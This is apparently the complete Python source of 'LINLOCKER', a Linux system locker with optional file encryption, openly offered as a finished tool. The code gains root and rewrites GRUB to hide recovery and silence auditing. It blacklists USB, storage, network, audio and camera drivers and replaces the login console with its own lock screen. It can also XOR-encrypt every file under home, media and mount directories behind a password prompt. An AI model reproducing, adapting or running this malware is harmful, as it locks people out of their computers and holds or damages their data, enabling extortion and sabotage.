# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 10.02.2026
# APP: LINLOCKER
# TYPE: OS_LOCKER
# VERSION: LATEST
# PLATFORM: linux


#
#-
#--
#---
#----
#-----
#------
PASSWORD = '' # HERE IS LINLOCKER PASSWORD
ENCRYPTION = False # RESPONSIBLE FOR ENCRYPTION (ENABLED IF ENCRYPTION == True ELSE DISABLED)
MSG = '''
 ####      ####    ##   ##  ####      #####     ####   ###  ##  #######  ######
  ##        ##     ###  ##   ##      ##   ##   ##  ##   ##  ##   ##   #   ##  ##
  ##        ##     #### ##   ##      ##   ##  ##        ## ##    ## #     ##  ##
  ##        ##     ## ####   ##      ##   ##  ##        ####     ####     #####
  ##   #    ##     ##  ###   ##   #  ##   ##  ##        ## ##    ## #     ## ##
  ##  ##    ##     ##   ##   ##  ##  ##   ##   ##  ##   ##  ##   ##   #   ##  ##
 #######   ####    ##   ##  #######   #####     ####   ###  ##  #######  #### ##


Your system is completely locked
Enter password to unlock it
'''
#------
#-----
#----
#---
#--
#-
#




import os
from sys import exit as _exit, argv, platform, executable
from subprocess import run as sp_run, DEVNULL
from shutil import move as move_file
from multiprocessing import Process
from mmap import mmap, ACCESS_WRITE
from hashlib import sha256
from glob import glob


PATH = '/etc/linlocker'
FILE_LINLOCKER = os.path.join(PATH, 'linlocker')
FILE_FLAG = os.path.join(PATH, '._')

OS_RELEASE = '/etc/os-release'
GRUB = '/etc/default/grub'
MODPROBE = '/etc/modprobe.d/linlocker.conf'
GETTY = '/etc/systemd/system/getty@.service.d'
OVERRIDE_CONF = os.path.join(GETTY, 'override.conf')
USERS = glob('/home/*')

ENCRYPTION_PATH = USERS + glob('/media/*') + glob('/mnt/*')
ENCRYPTION_MARK = b'\x1bB\xcd\x1f$v\xd0\xd3'
KEY = (0, 1)

SUDO = '/usr/bin/pkexec' if (os.environ.get('DISPLAY', False) 
    or os.environ.get('WAYLAND_DISPLAY', False)) else '/usr/bin/sudo'

ID = 'linux'


def invalid_type(name, value, valid):
    if not isinstance(value, valid):
        raise TypeError(f'({name}) must be ({valid.__name__})')


def get_distribution():
    if not os.path.isfile(OS_RELEASE):
        return 'linux'
    
    with open(OS_RELEASE, 'r') as f:
        for n in f:
            n = n.strip().replace('"', '').lower()

            if n.startswith('id='):
                return n[3:]

    return 'linux'


def cmd(c, _new=False):
    try:
        return sp_run(c, input=False, stdout=DEVNULL, stderr=DEVNULL, start_new_session=_new).returncode
    except:
        return -1


def get_root():
    if '--root' in argv:
        return

    Process(target=lambda: cmd(
        [SUDO, executable, __file__, '--root'], 
        _new=True
    )).start()
    os._exit(0)


def update_grub():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-grub'])
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'])
    elif ID in {'void'}:
        if cmd(['update-grub']) == 0:
            return 
        
        cmd(['grub-mkconfig', '-o', '/boot/grub/grub.cfg'])
    else:
        for n in (
            ['update-grub'],
            ['grub-mkconfig', '-o', '/boot/grub/grub.cfg'],
            ['grub2-mkconfig', '-o', '/boot/grub2/grub.cfg'],
        ):
            if cmd(n) == 0:
                return 


def update_initramfs():
    if ID in {'debian', 'ubuntu', 'linuxmint', 'pop', 'kali'}:
        cmd(['update-initramfs', '-u', '-k', 'all']) 
    elif ID in {'arch', 'manjaro', 'endeavouros'}:
        cmd(['mkinitcpio', '-P'])
    elif ID in {'fedora', 'rhel', 'centos', 'rocky', 'almalinux'}:
        cmd(['dracut', '--force']) 
    elif ID in {'opensuse', 'opensuse-leap', 'opensuse-tumbleweed'}:
        cmd(['mkinitrd'])
    elif ID in {'void'}:
        cmd(['xbps-reconfigure', '-fa'])
    else:
        for n in (
            ['update-initramfs', '-u', '-k', 'all'],
            ['mkinitcpio', '-P'],
            ['dracut', '--force'],
            ['mkinitrd'],
        ):
            if cmd(n) == 0:
                return 


def generate_password(password, length):
    hash_bytes = sha256(password.encode()).digest()

    return (hash_bytes * ((length // len(hash_bytes)) + 1))[:length]


def enc(handle):
    k0 = KEY[0]
    k1 = KEY[1]

    i = 0

    with mmap(handle, 0, access=ACCESS_WRITE) as mf:
        for n in range(len(mf)):
            b = mf[n]
            x = b ^ (((k1 + k0) + i) & 0xFF)
            k0 = (k0 ^ x) & 0xFF
            mf[n] = x
            i += 1


def encrypt_file(path):
    try:
       with open(path, 'rb+') as f:
            if f.read(len(ENCRYPTION_MARK)) == ENCRYPTION_MARK:
                print(path, 'ok!')
                return
        
            f.seek(0, os.SEEK_SET)
            f.write(ENCRYPTION_MARK)
            enc(f.fileno())
    except:
        print(path, 'no!')
    else:
        print(path, 'ok!')


def encrypt(root_path):
    for root, _, files in os.walk(root_path):
        for n in files:
            fp = os.path.join(root, n)

            if not os.path.isfile(fp):
                continue

            encrypt_file(fp)


def init():
    if not os.path.isdir(PATH):
        os.mkdir(PATH)

    if not os.path.isfile(FILE_LINLOCKER) and os.path.isfile(__file__):
        move_file(__file__, FILE_LINLOCKER)
    
    with open(GRUB, 'w') as f:
        f.write('''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT_QUIET=true
GRUB_DISABLE_RECOVERY=true
GRUB_RECORDFAIL_TIMEOUT=0
GRUB_DISTRIBUTOR="linlocker"
GRUB_CMDLINE_LINUX_DEFAULT="quiet nosplash audit=0 loglevel=0 rd.udev.log_level=0 systemd.show_status=0 systemd.confirm_spawn=0 systemd.unit=multi-user.target"
GRUB_CMDLINE_LINUX=""
GRUB_TERMINAL=console
''')
    
    with open(MODPROBE, 'w') as f:
        f.write('''# USB & Storage     
install usbcore /bin/false
install uas /bin/false
install usb_storage /bin/false
install cdc_acm /bin/false
install mmc_block /bin/false
install ehci_hcd /bin/false
install xhci_hcd /bin/false
install ohci_hcd /bin/false
install fuse /bin/false       
install nbd /bin/false 
# Wireless & Network
install ath10k_pci /bin/false
install btbcm /bin/false
install orinoco /bin/false
install prism2_usb /bin/false
install ath9k /bin/false
install b43 /bin/false
install e1000e /bin/false
install iwlwifi /bin/false
install r8169 /bin/false
install brcmsmac /bin/false
install rtl8188eu /bin/false
install rtl8192cu /bin/false
install bnep /bin/false
install bluetooth /bin/false
install btusb /bin/false
install rfcomm /bin/false
install cdc_ether /bin/false
install usbnet /bin/false
install tun /bin/false
install tap /bin/false
install veth /bin/false
install macvlan /bin/false
install dummy /bin/false
install bridge /bin/false
# Audio
install snd_hda_intel /bin/false
install snd_hda_codec_hdmi /bin/false
install snd_soc_sst_broadwell /bin/false
install snd_sof_pci /bin/false
install snd_usb_audio /bin/false
# Video & Camera
install gspca_main /bin/false
install gspca_v4l /bin/false
install uvcvideo /bin/false
''')
        
    if not os.path.isdir(GETTY):
        os.mkdir(GETTY)
        
    with open(OVERRIDE_CONF, 'w') as f:
        f.write(f'''[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin root %I $TERM      
ExecStart=          
ExecStart="{executable}" "{FILE_LINLOCKER}" --root                  
Restart=always
RestartSec=1
''')
        
    update_grub()
    update_initramfs()
    cmd(['systemctl', 'set-default', 'multi-user.target'])
    cmd(['systemctl', 'enable', 'getty.target'])
    cmd(['systemctl', 'disable', 'NetworkManager'])
    with open(FILE_FLAG, 'w') as f: ...
    cmd(['reboot'])


def shell():
    sp_run('clear', shell=True)

    if ENCRYPTION:
        for n in ENCRYPTION_PATH:
            try: 
                encrypt(n)
            except:
                print(n, 'no!')
                continue

    while True:
        try:
            welcome()
        except: 
            continue


def welcome():
    sp_run('clear', shell=True)
    
    print(MSG)

    try:
        password = input('PASSWORD: ').strip()
    except EOFError:
        return

    if password == PASSWORD:
        sp_run('clear', shell=True)
        print('Your system has been restored')
        destroy()
    elif password == 'exit':
        cmd(['poweroff'])
        _exit(0)


def destroy():
    cmd(['rm', '-rf', PATH])

    with open(GRUB, 'w') as f:
        f.write(f'''GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_DISTRIBUTOR="{ID.capitalize()}"
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash"
GRUB_CMDLINE_LINUX=""
''')
        
    if os.path.isfile(MODPROBE):
        os.remove(MODPROBE)
    
    if os.path.isfile(OVERRIDE_CONF):
        os.remove(OVERRIDE_CONF)
    
    update_grub()
    update_initramfs()
    cmd(['systemctl', 'set-default', 'graphical.target'])
    cmd(['systemctl', 'enable', 'NetworkManager'])

    if ENCRYPTION:
        for n in USERS:
            try:
                with open(os.path.join(n, 'requirement.txt'), 'w') as f:
                    f.write(MSG)
            except:
                continue

    cmd(['reboot'])
    _exit(0)
    

def main():
    global KEY, ID

    invalid_type('PASSWORD', PASSWORD, str)
    invalid_type('ENCRYPTION', ENCRYPTION, bool)
    invalid_type('MSG', MSG, str)

    if not PASSWORD:
        raise ValueError('(PASSWORD) is empty')

    if not os.path.isfile(GRUB):
        print(f'DO NOT SUPPORT ({platform})')
        _exit(1)

    get_root()

    KEY = generate_password(PASSWORD, 2)

    for n in (
        ['stty', 'intr', 'undef'],
        ['stty', 'quit', 'undef'],
        ['stty', 'susp', 'undef'],
        ['stty', 'ixon', 'off'],
        ['stty', 'ixoff', 'off'],
        ['stty', 'echo', 'off'],
        ['stty', 'echoctl', 'off']
    ):
        cmd(n)

    ID = get_distribution()

    (shell if os.path.isfile(FILE_FLAG) else init)()
    _exit(0)


if __name__ == '__main__': main()